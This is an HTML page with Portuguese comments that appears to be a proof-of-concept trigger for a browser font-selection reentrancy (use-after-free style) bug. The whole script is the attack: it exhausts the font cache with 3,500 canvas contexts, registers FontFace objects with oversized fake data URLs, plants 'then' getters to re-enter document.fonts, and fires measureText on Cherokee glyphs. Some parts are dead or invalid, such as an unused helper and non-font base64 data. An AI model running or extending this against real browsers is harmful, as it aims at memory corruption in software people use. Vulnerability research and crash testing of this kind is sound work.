<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Main Thread Font Reentrancy Test</title>
</head>
<body>
<p>Este teste executa a validação de reentrância diretamente na Thread Principal.</p>
<script>
async function loadFontAsDataURL() {
    // Cria um buffer de dados fictício ou utiliza uma base64 de fonte válida para o teste
    const base64DummyFont = 'AAEAAAAKAIAAAwAgT1MvMg'+'A'.repeat(1000); 
    return 'data:font/ttf;base64,' + btoa('A'.repeat(100000));
}

async function runTest() {
    try {
        console.log("Iniciando preparação do teste na Main Thread...");

        // 1. Esgotamento do cache de fontes para forçar o prune inline (equivalente aos dummies)
        const dummies = [];
        for (let i = 0; i < 3500; i++) {
            const canvas = document.createElement('canvas');
            canvas.width = 1;
            canvas.height = 1;
            const dummy = canvas.getContext('2d');
            dummy.font = '10px "dummy' + i + '"';
            dummies.push(dummy);
        }

        // 2. Configuração das fontes com FontFace
        const pendingFontURL = 'url("data:font/ttf;base64,' + 'A'.repeat(800000) + '")';
        
        const face1 = new FontFace('testFace', pendingFontURL);
        const face2 = new FontFace('testFace', pendingFontURL, { unicodeRange: 'U+13A0-13FF' });
        
        document.fonts.add(face1);
        document.fonts.add(face2);

        void face1.loaded;
        void face2.loaded;

        // 3. Interceptação para forçar a reentrância (estilo UAF do CSSFontSelector)
        const reenterFontFaceSet = function() {
            document.fonts.add(new FontFace('unrelated', 'local("nonexistent")'));
        };
        
        // Tenta injetar o gatilho se as propriedades permitirem a definição
        try {
            Object.defineProperty(face1, 'then', { get: reenterFontFaceSet });
            Object.defineProperty(face2, 'then', { get: reenterFontFaceSet });
        } catch (e) {
            console.log("Nota: Restrição de propriedade ignorada pelo motor.");
        }

        // 4. Criação do elemento Canvas na Main Thread
        const canvas = document.createElement('canvas');
        canvas.width = 64;
        canvas.height = 64;
        canvas.style.display = 'none';
        document.body.appendChild(canvas);
        
        const context = canvas.getContext('2d');
        context.font = '10px Times, testFace';

        // 5. Disparador do percurso de glifos (equivalente ao measureText da PoC)
        console.log("Disparando measureText...");
        context.measureText('\u13A0\u13A2\u13A4');
        
        console.log("Teste concluído sem crash.");
    } catch (err) {
        console.error("Erro durante a execução: ", err);
    }
}

// Executa o script após o carregamento da página
window.onload = runTest;
</script>
</body>
</html>
